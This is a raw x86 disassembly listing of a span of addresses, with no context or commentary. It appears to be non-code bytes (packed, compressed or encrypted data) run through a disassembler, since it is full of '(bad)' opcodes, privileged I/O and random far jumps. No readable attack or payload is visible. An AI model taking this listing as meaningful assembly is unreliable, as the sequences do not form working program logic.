  417205:	xor    BYTE PTR [eax-0x5d],cl
  417208:	pop    ebx
  417209:	iret   
  41720a:	adc    ecx,ebx
  41720c:	sahf   
  41720d:	sbb    ah,BYTE PTR [ebp+0x16900430]
  417213:	loope  0x417282
  417215:	xor    BYTE PTR [edi+0x29],dl
  417218:	fiadd  WORD PTR [edi+eax*8+0x75024829]
  41721f:	sbb    BYTE PTR [esi+ebp*8],cl
  417222:	add    al,0x42
  417224:	jg     0x4171e5
  417226:	mov    ebx,0x267f5892
  41722b:	cmc    
  41722c:	adc    bh,ch
  41722e:	inc    esp
  41722f:	jge    0x417263
  417231:	sub    esi,DWORD PTR [edx+0x4]
  417234:	or     bl,BYTE PTR [ebp+0x500bda3e]
  41723a:	xchg   edx,eax
  41723b:	jmp    0x35e700a6
  417240:	(bad)  
  417241:	dec    edi
  417242:	sbb    edi,DWORD PTR [edi+0x9]
  417245:	xor    cl,BYTE PTR [edx-0x4a]
  417248:	adc    dl,BYTE PTR ds:0x711a6dd7
  41724e:	nop
  41724f:	and    eax,0x91a58e7d
  417254:	push   cs
  417255:	(bad)  [edi-0x4a]
  417258:	mov    eax,ds:0xb1765203
  41725d:	mov    fs,edi
  41725f:	jmp    0x8f75a0fd
  417264:	inc    edi
  417265:	shr    BYTE PTR [ebx],0x7a
  417268:	adc    ebp,DWORD PTR [ebx-0x6ba417ef]
  41726e:	xchg   esp,eax
  41726f:	pop    ecx
  417270:	rcl    DWORD PTR [ebx],0x46
  417273:	or     esi,DWORD PTR [ebp-0x57d359ac]
  417279:	das    
  41727a:	mov    cl,0xb7
  41727c:	sub    BYTE PTR [ebx+0x239c4527],0x56
  417283:	mov    dh,0x82
  417285:	pop    ds
  417286:	or     BYTE PTR [ecx-0x5357a2b1],0x77
  41728d:	out    0x76,eax
  41728f:	cli    
  417290:	out    dx,al
  417291:	xor    al,0x4a
  417293:	xchg   ecx,eax
  417294:	mov    edi,0x96ea80c9
  417299:	add    esp,DWORD PTR [esi+0x4d]
  41729c:	not    DWORD PTR [ecx-0x61]
  41729f:	xchg   BYTE PTR [edx+0x67bf0c41],dl
  4172a5:	test   DWORD PTR [edx-0x4d183606],edx
  4172ab:	(bad)  
  4172ac:	mov    al,0x58
  4172ae:	jp     0x417316
  4172b0:	dec    esp
  4172b1:	mov    ebp,0xcb8d18ea
  4172b6:	cmp    al,0x59
  4172b8:	ficomp DWORD PTR ds:0xee8dba42
  4172be:	jmp    0x417297
  4172c0:	dec    ecx
  4172c1:	adc    eax,0xb0beb28e
  4172c6:	jo     0x417281
  4172c8:	popa   
  4172c9:	xor    eax,DWORD PTR [eax+0x47]
  4172cc:	ret    0x83d2
  4172cf:	jg     0x4172e4
  4172d1:	rcr    BYTE PTR [edi+0x2a],cl
  4172d4:	mov    edi,0x7dfa6a65
  4172d9:	jb     0x4172f7
  4172db:	adc    DWORD PTR [edi],esi
  4172dd:	jbe    0x417270
  4172df:	jg     0x41726e
  4172e1:	hlt    
  4172e2:	cmp    DWORD PTR [ebp+0x5c54d0af],eax
  4172e8:	mov    ?,WORD PTR [edx+0x58]
  4172eb:	pop    esp
  4172ec:	dec    esi
  4172ed:	daa    
  4172ee:	icebp  
  4172ef:	mov    al,ch
  4172f1:	in     al,0x2c
  4172f3:	dec    esp
  4172f4:	mov    edx,0xb6ed0d9a
  4172f9:	xchg   ebx,eax
  4172fa:	das    
  4172fb:	push   cs
  4172fc:	xchg   BYTE PTR [esi+0x4c793e06],al
  417302:	mov    BYTE PTR [ebp-0x58],ah
  417305:	leave  
  417306:	imul   esp,DWORD PTR [edi-0x21],0x7b
  41730a:	pop    ecx
  41730b:	pop    ebp
  41730c:	dec    esp
  41730d:	(bad)  
  41730e:	pop    ebp
  41730f:	jb     0x417355
  417311:	test   al,0x35
  417313:	pop    eax
  417314:	mov    DWORD PTR [eax-0x4b],edx
  417317:	shr    DWORD PTR [ecx+0x66],cl
  41731a:	sbb    bl,BYTE PTR [ebp+0x72]
  41731d:	push   0xc426619e
  417322:	in     al,0xe
  417324:	rcl    DWORD PTR [ecx-0x61ca677b],cl
  41732a:	adc    BYTE PTR [esi],ch
  41732c:	imul   edi,DWORD PTR [edx+0x60fe416d],0xffffffed
  417333:	shl    dh,cl
  417335:	enter  0x174,0xfe
  417339:	ret    
  41733a:	push   esp
  41733b:	fisttp QWORD PTR [ebp+0x3dd66307]
  417341:	aam    0xf0
  417343:	cs iret 
  417345:	adc    al,ah
  417347:	sti    
  417348:	fst    QWORD PTR [ecx-0x47]
  41734b:	dec    edi
  41734c:	adc    al,0x29
  41734e:	mov    ebp,0xa609a6d6
  417353:	data16 loop 0x417372
  417356:	mov    ds:0xebd1daec,eax
  41735b:	loop   0x417358
  41735d:	jno    0x417379
  41735f:	arpl   WORD PTR [edi],bx
  417361:	lods   eax,DWORD PTR ds:[esi]
  417362:	cmp    ah,bh
  417364:	push   ss
  417365:	mov    dl,0xd1
  417367:	jne    0x4173b7
  417369:	mov    ah,ah
  41736b:	add    DWORD PTR [ebx+0x3f],esi
  41736e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736f:	mov    ds:0x966f55f,al
  417374:	push   ecx
  417375:	jns    0x417395
  417377:	push   esp
  417378:	pusha  
  417379:	inc    ebp
  41737a:	shl    DWORD PTR [ebp-0x67],0x22
  41737e:	inc    esp
  41737f:	je     0x417381
  417381:	sub    DWORD PTR [ebx+0x14],edi
  417384:	and    esp,ebp
  417386:	sub    BYTE PTR [edi],bh
  417388:	fmul   DWORD PTR [ecx+ebx*8]
  41738b:	jbe    0x4173fc
  41738d:	rcr    BYTE PTR [eax-0x125d2043],1
  417393:	mov    ds:0x3854209f,eax
  417398:	(bad)  cs:[edi-0x1]
  41739c:	mov    DWORD PTR [esi+0x36],edx
  41739f:	dec    esi
  4173a0:	test   cl,bl
  4173a2:	in     eax,0xd7
  4173a4:	pop    ebx
  4173a5:	inc    edi
  4173a6:	lock adc esi,DWORD PTR [ebp-0x796de134]
  4173ad:	add    DWORD PTR [ebp-0x32],ebx
  4173b0:	mov    dh,0x43
  4173b2:	loopne 0x4173cc
  4173b4:	scas   al,BYTE PTR es:[edi]
  4173b5:	or     bl,BYTE PTR [eax+0x15f333aa]
  4173bb:	pop    esp
  4173bc:	fs xchg esi,eax
  4173be:	ret    0x8fae
  4173c1:	cmovbe ebp,DWORD PTR [edx-0x50]
  4173c5:	test   ah,dh
  4173c7:	pop    ecx
  4173c8:	das    
  4173c9:	pop    ss
  4173ca:	pop    esp
  4173cb:	rol    DWORD PTR [eax-0x56e9d2e7],0xff
  4173d2:	(bad)  
  4173d3:	pop    eax
  4173d4:	inc    edi
  4173d5:	cld    
  4173d6:	and    BYTE PTR [edi+0x12],cl
  4173d9:	xchg   edi,eax
  4173da:	retf   0x3eb7
  4173dd:	pop    es
  4173de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173df:	sub    al,0x5e
  4173e1:	pop    ebx
  4173e2:	inc    edi
  4173e3:	and    al,0x92
  4173e5:	dec    eax
  4173e6:	cmp    eax,edx
  4173e8:	inc    eax
  4173e9:	data16 mov ds:0x16b60266,al
  4173ef:	test   eax,0xd52545db
  4173f4:	mov    eax,0x1e0f1601
  4173f9:	pop    es
  4173fa:	(bad)  ds:0x12aa613
  417400:	add    al,0x37
  417402:	dec    ebx
  417403:	push   edi
  417404:	jbe    0x4173df
  417406:	in     eax,0x72
  417408:	shr    DWORD PTR [ebx+ebx*4-0x64],1
  41740c:	sub    eax,0x40cc09d5
  417411:	das    
  417412:	dec    esi
  417413:	jbe    0x41742f
  417415:	mov    ds:0x65c6162,al
  41741a:	inc    ebp
  41741b:	pop    edx
  41741c:	cwde   
  41741d:	iret   
  41741e:	xchg   DWORD PTR [esi+0x15],edi
  417421:	mov    dl,0xd1
  417423:	mov    esp,0xea2d39f4
  417428:	add    bl,BYTE PTR [ecx+0x4e]
  41742b:	xchg   ebp,eax
  41742c:	out    dx,eax
  41742d:	fsubr  st(1),st
  41742f:	or     eax,0x12c608a1
  417434:	or     BYTE PTR [eax],dh
  417436:	clc    
  417437:	and    eax,0x76dba7fd
  41743c:	jmp    FWORD PTR [edx+0x12]
  41743f:	ja     0x41747c
  417441:	rcl    ecx,0xc2
  417444:	jecxz  0x41741d
  417446:	fimul  DWORD PTR [eax]
  417448:	jp     0x41749e
  41744a:	or     al,0x1e
  41744c:	std    
  41744d:	outs   dx,BYTE PTR ds:[esi]
  41744e:	cmp    ebp,DWORD PTR [eax+esi*8]
  417451:	scas   eax,DWORD PTR es:[edi]
  417452:	mov    al,ds:0xf8ef4084
  417457:	xor    ebx,DWORD PTR [esi]
  417459:	xor    ebp,eax
  41745b:	cmp    edx,esp
  41745d:	and    ebx,DWORD PTR [edx+0x79cfcf42]
  417463:	or     eax,0x222cf3c2
  417468:	mov    cl,0xc2
  41746a:	js     0x417491
  41746c:	je     0x417405
  41746e:	fcmovbe st,st(1)
  417470:	mov    al,0xf
  417472:	int3   
  417473:	mov    ebp,0xc6c514e1
  417478:	push   0x4c
  41747a:	in     al,dx
  41747b:	jo     0x4174eb
  41747d:	pop    ds
  41747e:	clc    
  41747f:	mov    ds:0x73c375d0,eax
  417484:	xchg   esi,eax
  417485:	jae    0x417455
  417487:	(bad)  
  417488:	xchg   ecx,eax
  417489:	mov    BYTE PTR [ecx],ch
  41748b:	jbe    0x41744f
  41748d:	sti    
  41748e:	push   esi
  41748f:	pop    eax
  417490:	out    dx,eax
  417491:	or     bh,al
  417493:	mov    eax,ds:0xb62c52d6
  417498:	in     eax,0x5c
  41749a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41749b:	inc    eax
  41749c:	jbe    0x4174de
  41749e:	(bad)  
  41749f:	mov    WORD PTR [ecx+0x26],gs
  4174a2:	add    DWORD PTR [edx-0x17ff942b],edx
  4174a8:	stos   DWORD PTR es:[edi],eax
  4174a9:	outs   dx,DWORD PTR ds:[esi]
  4174aa:	or     bh,0x23
  4174ad:	mov    esi,0x76986c1d
  4174b2:	mov    bl,0x75
  4174b4:	aad    0xd8
  4174b6:	dec    esi
  4174b7:	out    dx,eax
  4174b8:	shr    BYTE PTR [ebx],1
  4174ba:	jle    0x41745d
  4174bc:	or     eax,0xa7fff035
  4174c1:	xor    BYTE PTR [eax+0xe],ah
  4174c4:	es inc eax
  4174c6:	jae    0x4174bd
  4174c8:	ret    
  4174c9:	add    dl,BYTE PTR [ebp+eax*2-0x24b1f87]
  4174d0:	lods   al,BYTE PTR ds:[esi]
  4174d1:	in     eax,dx
  4174d2:	sbb    eax,0x34afb569
  4174d7:	and    DWORD PTR [esi-0x5a],0x6282018f
  4174de:	sbb    al,0x14
  4174e0:	and    al,BYTE PTR [esi+ecx*1+0x67]
  4174e4:	add    cl,ah
  4174e6:	jnp    0x417561
  4174e8:	fcmovu st,st(4)
  4174ea:	pop    ecx
  4174eb:	or     ch,ch
  4174ed:	shl    DWORD PTR [edi+0x767a54d5],0x9c
  4174f4:	loop   0x417562
  4174f6:	in     al,0xdf
  4174f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f9:	xchg   edx,eax
  4174fa:	xor    ah,BYTE PTR [ecx+0x142a284e]
  417500:	jne    0x417549
  417502:	dec    eax
  417503:	mov    ch,0xe3
  417505:	lock bound ebp,QWORD PTR [eax-0x7f]
  417509:	test   DWORD PTR [ebx],ecx
  41750b:	addr16 dec ebp
  41750d:	xor    ebx,DWORD PTR [edi]
  41750f:	sbb    esp,DWORD PTR [eax+0x9]
  417512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417513:	dec    ebx
  417514:	inc    ecx
  417515:	jl     0x41752e
  417517:	int3   
  417518:	or     DWORD PTR [edx-0x70],0x65
  41751c:	pusha  
  41751d:	inc    eax
  41751e:	push   edi
  41751f:	ins    BYTE PTR es:[edi],dx
  417520:	outs   dx,DWORD PTR ds:[esi]
  417521:	imul   eax,DWORD PTR [ecx-0x26],0x162764ef
  417528:	data16 or bl,BYTE PTR [edi+0x6fee6291]
  41752f:	xor    DWORD PTR [ebx-0x5aff23eb],ebp
  417535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417536:	and    esp,ebp
  417538:	hlt    
  417539:	enter  0x42ee,0x6b
  41753d:	in     al,0xfd
  41753f:	fs xchg ebx,eax
  417541:	mov    eax,0xbd4b698f
  417546:	ror    DWORD PTR [ebx],1
  417548:	xchg   ebp,eax
  417549:	mov    cl,0x31
  41754b:	rcl    DWORD PTR [esi-0x2b],1
  41754e:	jmp    0x1f55:0x83af28ad
  417555:	xchg   ecx,eax
  417556:	adc    eax,0xe3f125a2
  41755b:	or     BYTE PTR [eax-0x41e36f67],ch
  417561:	xlat   BYTE PTR ds:[ebx]
  417562:	dec    esi
  417563:	popf   
  417564:	outs   dx,DWORD PTR ds:[esi]
  417565:	mov    al,0x2
  417567:	pop    edx
  417568:	imul   esp,DWORD PTR [ecx],0x92183e68
  41756e:	jns    0x417546
  417570:	mov    BYTE PTR [edi+edi*8],cl
  417573:	dec    ebp
  417574:	mov    WORD PTR [edx-0x2b],gs
  417577:	push   cs
  417578:	popf   
  417579:	jmp    0xf5e7:0xc310e6be
  417580:	mov    ebx,0x80a41d80
  417585:	dec    ebp
  417586:	cmp    ebx,DWORD PTR [ecx-0x17]
  417589:	imul   ebp,edi,0xffffffb7
  41758c:	xor    DWORD PTR [edx+0x400c789c],edx
  417592:	out    dx,eax
  417593:	(bad)  
  417594:	outs   dx,BYTE PTR ds:[esi]
  417595:	rcr    DWORD PTR [edi],cl
  417597:	and    eax,0x5434c788
  41759c:	fcmovnu st,st(6)
  41759e:	jo     0x41752b
  4175a0:	popf   
  4175a1:	adc    eax,0x7d3506e2
  4175a6:	loop   0x417596
  4175a8:	inc    eax
  4175a9:	sub    eax,0xe464a49b
  4175ae:	psubusw mm7,QWORD PTR gs:[ecx+0xfe4dcd2]
  4175b6:	fcom   DWORD PTR [edi-0x56]
  4175b9:	sub    eax,DWORD PTR [ebp-0x45]
  4175bc:	fs ss mov al,0xa7
  4175c0:	mov    esp,0x21e0cc7c
  4175c5:	js     0x4175ef
  4175c7:	pop    es
  4175c8:	xchg   esi,eax
  4175c9:	cli    
  4175ca:	and    DWORD PTR [esi],esi
  4175cc:	fs popa 
  4175ce:	bound  ebp,QWORD PTR [eax]
  4175d0:	test   al,0x7c
  4175d2:	add    al,0xde
  4175d4:	inc    BYTE PTR [esi]
  4175d6:	mov    cl,0xab
  4175d8:	mov    ss,WORD PTR [esi+0x1b63b742]
  4175de:	add    ecx,DWORD PTR [ecx-0x2e]
  4175e1:	xor    eax,0x7db70331
  4175e6:	jecxz  0x4175a3
  4175e8:	jb     0x4175ff
  4175ea:	out    dx,eax
  4175eb:	ss jecxz 0x417611
  4175ee:	jmp    0xeb48:0x3d1cbd43
  4175f5:	push   ebx
  4175f6:	jae    0x417591
  4175f8:	mov    ecx,0xcfe19ed7
  4175fd:	push   ebp
  4175fe:	ins    DWORD PTR es:[edi],dx
  4175ff:	pop    eax
  417600:	sbb    esi,DWORD PTR [esi]
  417602:	add    edx,eax
  417604:	or     BYTE PTR [ecx+edx*2+0x5595e301],dh
  41760b:	inc    esp
  41760c:	in     eax,dx
  41760d:	(bad)  
  41760e:	rcr    DWORD PTR [edx+0x2a374a91],1
  417614:	xchg   ecx,eax
  417615:	nop
  417616:	dec    edi
  417617:	sub    al,bl
  417619:	push   eax
  41761a:	mov    ah,0xf6
  41761c:	enter  0x12d5,0xb7
  417620:	pusha  
  417621:	int3   
  417622:	mov    edx,0x16b803fe
  417627:	and    ecx,edx
  417629:	jp     0x417611
  41762b:	jno    0x417656
  41762d:	jnp    0x4175ca
  41762f:	push   edx
  417630:	mov    ebp,0x1b3d6835
  417635:	fcomp  DWORD PTR [edx]
  417637:	pushf  
  417638:	lahf   
  417639:	ret    
  41763a:	push   ebp
  41763b:	adc    eax,0xe48fc534
  417640:	ds es (bad) 
  417643:	pop    edx
  417644:	and    dh,cl
  417646:	(bad)  
  417647:	pop    ebp
  417648:	inc    edi
  417649:	jmp    0x8deb:0x1aad3f4d
  417650:	mov    esp,0xf9ad27d8
  417655:	jmp    FWORD PTR es:[edx-0xd]
  417659:	push   ebx
  41765a:	mov    edi,0xa9c0836b
  41765f:	sbb    BYTE PTR [ebp+0x41],0x23
  417663:	daa    
  417664:	popa   
  417665:	lock jg 0x4175fa
  417668:	icebp  
  417669:	test   ecx,0x224c752c
  41766f:	fs call 0x69a296b
  417675:	(bad)  
  417676:	ins    BYTE PTR es:[edi],dx
  417677:	push   0x1e
  417679:	inc    esi
  41767a:	jecxz  0x41767b
  41767c:	xor    eax,0x3f6593a0
  417681:	pop    es
  417682:	xor    DWORD PTR [esi],ecx
  417684:	sar    DWORD PTR [ecx+0x33],1
  417687:	dec    edi
  417688:	or     edx,ebx
  41768a:	mov    al,ds:0x3f78a517
  41768f:	or     al,0x47
  417691:	xchg   esp,eax
  417692:	sar    esp,0x35
  417695:	xor    BYTE PTR [edx],al
  417697:	test   al,dl
  417699:	mov    ds:0xb4619d17,al
  41769e:	xor    ebx,DWORD PTR [ecx-0x7a58cde8]
  4176a4:	js     0x4176c4
  4176a6:	lock or ebx,DWORD PTR [ecx-0x752d4a4e]
  4176ad:	mov    ch,0xe8
  4176af:	or     edi,eax
  4176b1:	or     DWORD PTR [ebp+eax*2+0x33efcbf2],ebp
  4176b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b9:	inc    ecx
  4176ba:	pop    edx
  4176bb:	mov    WORD PTR [ebp+ebx*4+0x79dc2e0e],?
  4176c2:	mov    edi,0x59bf64f9
  4176c7:	and    al,0x3c
  4176c9:	in     eax,dx
  4176ca:	leave  
  4176cb:	ret    
  4176cc:	dec    ecx
  4176cd:	dec    edx
  4176ce:	inc    ecx
  4176cf:	pop    eax
  4176d0:	sbb    dl,BYTE PTR [eax]
  4176d2:	clc    
  4176d3:	ja     0x417667
  4176d5:	lahf   
  4176d6:	sahf   
  4176d7:	xor    al,0xa1
  4176d9:	sahf   
  4176da:	xor    DWORD PTR [ebx-0x76f4657b],edx
  4176e0:	cmp    BYTE PTR [ebx+0x299ad010],al
  4176e6:	jp     0x41775c
  4176e8:	adc    edi,DWORD PTR [esi-0x1c]
  4176eb:	ficomp DWORD PTR [edx-0x77]
  4176ee:	sti    
  4176ef:	shr    ebp,cl
  4176f1:	mov    ch,0x6d
  4176f3:	jl     0x417715
  4176f5:	and    BYTE PTR [esi+0xf44dc05],0xaa
  4176fc:	test   ah,bh
  4176fe:	xor    al,0xf5
  417700:	sub    DWORD PTR [ecx+0x7f8dea09],esp
  417706:	fwait
  417707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417708:	mul    BYTE PTR [ecx]
  41770a:	outs   dx,BYTE PTR ds:[esi]
  41770b:	xor    eax,0x63c0bc0f
  417710:	mov    bl,0x34
  417712:	mov    esp,0x4c702cce
  417717:	inc    esi
  417718:	(bad)  
  41771a:	or     BYTE PTR [edx-0x4298b315],ch
  417720:	xchg   ebp,eax
  417721:	mov    ah,0x3a
  417723:	idiv   BYTE PTR fs:[eax+0x58]
  417727:	push   ecx
  417728:	aad    0xce
  41772a:	mov    al,0xd
  41772c:	xor    BYTE PTR [esi-0x41d878a4],bh
  417732:	fld    TBYTE PTR [ebp-0x15]
  417735:	call   0xda37:0x12ce8880
  41773c:	cdq    
  41773d:	sti    
  41773e:	loope  0x417783
  417740:	inc    esp
  417741:	sbb    eax,0x2734a071
  417746:	adc    BYTE PTR ds:0x7b259808,0xe0
  41774d:	out    0x9d,eax
  41774f:	fs jae 0x417724
  417752:	adc    dl,BYTE PTR [ebp+0x56b9b3b4]
  417758:	inc    edi
  417759:	mov    dl,0x8
  41775b:	ret    
  41775c:	jl     0x417781
  41775e:	cmp    ebx,DWORD PTR [ebp-0x1311d589]
  417764:	in     al,dx
  417765:	sub    BYTE PTR [edi-0x25],bl
  417768:	xor    esi,esp
  41776a:	les    eax,FWORD PTR [ecx+0x77]
  41776d:	or     al,0x52
  41776f:	clc    
  417770:	ins    DWORD PTR es:[edi],dx
  417771:	mov    al,ds:0x4cef195f
  417776:	adc    eax,DWORD PTR ds:0x71ab294c
  41777c:	jle    0x41777a
  41777e:	sub    eax,0xcf64d5e0
  417783:	and    DWORD PTR [edx],0x40
  417786:	daa    
  417787:	pop    ebp
  417788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417789:	sbb    DWORD PTR [esi],eax
  41778b:	test   BYTE PTR [eax+0x21],al
  41778e:	ret    
  41778f:	sub    DWORD PTR [ecx+0x7b],esp
  417792:	idiv   DWORD PTR [eax+0x48]
  417795:	xor    esi,DWORD PTR [edi]
  417797:	cld    
  417798:	cld    
  417799:	(bad)  
  41779a:	jp     0x417736
  41779c:	cmp    BYTE PTR [esi],al
  41779e:	push   0xb051a979
  4177a3:	or     esi,ebx
  4177a5:	mov    BYTE PTR [ecx+0x16],dl
  4177a8:	test   eax,0x74e6b56b
  4177ad:	popf   
  4177ae:	jmp    0x41778d
  4177b0:	lds    ebx,FWORD PTR [eax]
  4177b2:	mov    edi,0xcb5cc0a8
  4177b7:	(bad)  
  4177b8:	js     0x417798
  4177ba:	popf   
  4177bb:	lds    esp,FWORD PTR [ecx+edi*2]
  4177be:	repz pop eax
  4177c0:	xor    al,0xda
  4177c2:	cmc    
  4177c3:	mov    fs,WORD PTR [edx-0x7f354a30]
  4177c9:	sahf   
  4177ca:	push   ds
  4177cb:	push   es
  4177cc:	and    dl,dh
  4177ce:	in     eax,dx
  4177cf:	mov    eax,ecx
  4177d1:	es push ebp
  4177d3:	xchg   ebp,eax
  4177d4:	pop    edi
  4177d5:	lea    ebp,[esp+ecx*8-0x4f]
  4177d9:	fmul   st,st(2)
  4177db:	xchg   esp,eax
  4177dc:	mov    BYTE PTR ss:[edi+0x7683ff6c],bl
  4177e3:	dec    ebx
  4177e4:	mov    al,0xbe
  4177e6:	sbb    eax,0xfebfd016
  4177eb:	dec    eax
  4177ec:	imul   edx,DWORD PTR [edi+0x6876812d],0x1d
  4177f3:	(bad)  
  4177f4:	jae    0x4177c2
  4177f6:	adc    DWORD PTR [ebx-0x611bbc32],edi
  4177fc:	mov    bl,0xee
  4177fe:	jno    0x41781b
  417800:	inc    eax
  417801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417802:	popf   
  417803:	imul   esi,DWORD PTR [edx+edi*1-0x2e],0x5bb997f0
  41780b:	push   ebp
  41780c:	das    
  41780d:	icebp  
  41780e:	mov    dh,0x87
  417810:	add    ah,0xa3
  417813:	push   ecx
  417814:	add    al,0xe2
  417816:	xchg   ecx,eax
  417817:	push   ebp
  417818:	jno    0x417840
  41781a:	pcmpgtd mm1,QWORD PTR es:0x1bdf2df3
  417822:	cmp    eax,DWORD PTR [esp+edx*2-0x6d3c02af]
  417829:	pop    esp
  41782a:	xchg   cl,ch
  41782c:	xor    al,0x15
  41782e:	enter  0xaa12,0xea
  417832:	retf   
  417833:	push   eax
  417834:	push   0x206edbdd
  417839:	int3   
  41783a:	outs   dx,DWORD PTR ds:[esi]
  41783b:	lods   eax,DWORD PTR ds:[esi]
  41783c:	xor    BYTE PTR [ecx-0x82bb9a5],dh
  417842:	test   DWORD PTR [ebx-0x2a5e978d],edi
  417848:	into   
  417849:	sub    eax,0x50ec600e
  41784e:	pop    esp
  41784f:	adc    dh,ah
  417851:	jmp    FWORD PTR [edi+edi*4-0x6f3280c1]
  417858:	(bad)  
  417859:	xchg   ebx,eax
  41785a:	jecxz  0x41783c
  41785c:	pop    ds
  41785d:	pop    eax
  41785e:	xchg   ebx,eax
  41785f:	and    edx,DWORD PTR [ecx+0xd8b015d]
  417865:	ret    
  417866:	out    dx,al
  417867:	mov    eax,0x2221f17e
  41786c:	or     al,0x3e
  41786e:	shl    DWORD PTR [eax],0x10
  417871:	popa   
  417872:	inc    ebx
  417873:	or     al,0x89
  417875:	sub    BYTE PTR [edx],dl
  417877:	sbb    al,0x51
  417879:	test   BYTE PTR [ebp+0x4b],ch
  41787c:	js     0x4178c4
  41787e:	sub    dl,BYTE PTR [eax]
  417880:	xor    BYTE PTR [ebx],dl
  417882:	xchg   ebp,eax
  417883:	jmp    0x277:0x826acc40
  41788a:	xor    BYTE PTR [eax+edx*8],0xe
  41788e:	and    eax,0x1c05b9bb
  417893:	imul   ebp,ebp,0x52
  417896:	hlt    
  417897:	mov    al,0xf5
  417899:	stos   DWORD PTR es:[di],eax
  41789b:	dec    esp
  41789c:	add    al,BYTE PTR [edi+eiz*4-0x70]
  4178a0:	and    BYTE PTR [esi-0x28],ch
  4178a3:	aam    0xe4
  4178a5:	test   al,0x67
  4178a7:	in     eax,dx
  4178a8:	mov    eax,ds:0xf17d3aa
  4178ad:	add    cl,cl
  4178af:	pusha  
  4178b0:	aaa    
  4178b1:	sub    BYTE PTR [esi],0xd
  4178b4:	lods   al,BYTE PTR ds:[esi]
  4178b5:	mov    eax,ds:0x86278961
  4178ba:	add    ebx,DWORD PTR [eax-0x4af7a50]
  4178c0:	mov    DWORD PTR [ebx-0x46],ebp
  4178c3:	fld    DWORD PTR [edx]
  4178c5:	test   al,0x17
  4178c7:	sub    DWORD PTR [eax+0x36dcc97d],esi
  4178cd:	repnz adc cl,BYTE PTR [esi]
  4178d0:	inc    ebx
  4178d1:	fwait
  4178d2:	xor    ah,al
  4178d4:	out    0xad,al
  4178d6:	ins    DWORD PTR es:[edi],dx
  4178d7:	inc    edi
  4178d8:	jge    0x41788b
  4178da:	add    eax,0x12089bae
  4178df:	daa    
  4178e0:	stos   DWORD PTR es:[edi],eax
  4178e1:	dec    edi
  4178e2:	dec    eax
  4178e3:	cmp    DWORD PTR [edx-0x6f245624],ecx
  4178e9:	jbe    0x417935
  4178eb:	popf   
  4178ec:	fcom   DWORD PTR [ecx+0x47]
  4178ef:	loopne 0x4178f1
  4178f1:	arpl   WORD PTR [edi-0x39],di
  4178f4:	(bad)  
  4178f5:	cli    
  4178f6:	stc    
  4178f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f8:	push   es
  4178f9:	pop    esp
  4178fa:	imul   esi,DWORD PTR [edi+0x7e],0x9e43e853
  417901:	mov    eax,ds:0xb4630d84
  417906:	jmp    0x9a3e:0xb1d0f429
  41790d:	je     0x417920
  41790f:	(bad)  
  417910:	push   esi
  417911:	int3   
  417912:	ins    BYTE PTR es:[edi],dx
  417913:	mov    eax,ds:0x4a010e82
  417918:	jmp    0x981a:0xf004cf6a
  41791f:	retf   
  417920:	lahf   
  417921:	cld    
  417922:	dec    edi
  417923:	int3   
  417924:	or     DWORD PTR [ecx+eiz*4],eax
  417927:	repnz out dx,al
  417929:	in     eax,dx
  41792a:	popa   
  41792b:	xor    esi,DWORD PTR [edx]
  41792d:	xchg   ecx,eax
  41792e:	xchg   ebx,eax
  41792f:	call   0x788:0xa1051e03
  417936:	dec    edx
  417937:	or     al,0xf3
  417939:	push   ss
  41793a:	aam    0x81
  41793c:	inc    esi
  41793d:	cwde   
  41793e:	push   es
  41793f:	nop
  417940:	xchg   ebp,eax
  417941:	or     al,0xb3
  417943:	in     eax,dx
  417944:	fwait
  417945:	add    BYTE PTR [edx],ah
  417947:	xchg   DWORD PTR [esi],ebx
  417949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794a:	fldcw  WORD PTR [eax+eiz*8+0x3d]
  41794e:	(bad)  
  41794f:	fidivr WORD PTR [ebx-0x15615ad7]
  417955:	inc    eax
  417956:	adc    dh,BYTE PTR [ecx+eiz*8]
  417959:	lds    ebx,FWORD PTR [edx+0x66356c1a]
  41795f:	push   edi
  417960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417961:	and    dl,al
  417963:	mov    ebp,0x86a29c4b
  417968:	add    dl,BYTE PTR [esp+esi*1-0x28]
  41796c:	push   esi
  41796d:	js     0x417960
  41796f:	xor    edx,DWORD PTR [ecx-0x5f5007e2]
  417975:	in     eax,0x23
  417977:	xchg   esi,eax
  417978:	push   ds
  417979:	mov    al,ds:0x2eda9998
  41797e:	mov    bh,ah
  417980:	mov    cl,0x1a
  417982:	aas    
  417983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417984:	mov    ah,0xe
  417986:	aad    0xd4
  417988:	adc    eax,0xefa0a340
  41798d:	xor    DWORD PTR [ebp+ebx*1-0x5f0dfe28],ebp
  417994:	sub    DWORD PTR [edi-0x45392d60],esp
  41799a:	fmul   QWORD PTR [eax-0x543eba15]
  4179a0:	dec    ebx
  4179a1:	mul    DWORD PTR [edi-0x6a]
  4179a4:	loope  0x4179f4
  4179a6:	jmp    0x9ce4b9c
  4179ab:	mov    bl,BYTE PTR [ecx+0x76fb5104]
  4179b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179b2:	arpl   di,ax
  4179b4:	sub    eax,0xc094ce13
  4179b9:	sub    cl,bl
  4179bb:	jne    0x417a00
  4179bd:	loop   0x417a06
  4179bf:	(bad)  
  4179c0:	js     0x4179d9
  4179c2:	jb     0x417a3a
  4179c4:	fst    QWORD PTR [ecx+0x5]
  4179c7:	test   bl,al
  4179c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ca:	mov    ecx,0xdaeb99fc
  4179cf:	in     al,dx
  4179d0:	pop    ds
  4179d1:	mov    esi,0xd966e82d
  4179d6:	dec    edi
  4179d7:	aaa    
  4179d8:	in     al,0xf7
  4179da:	xor    DWORD PTR [esi],0x53399af2
  4179e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
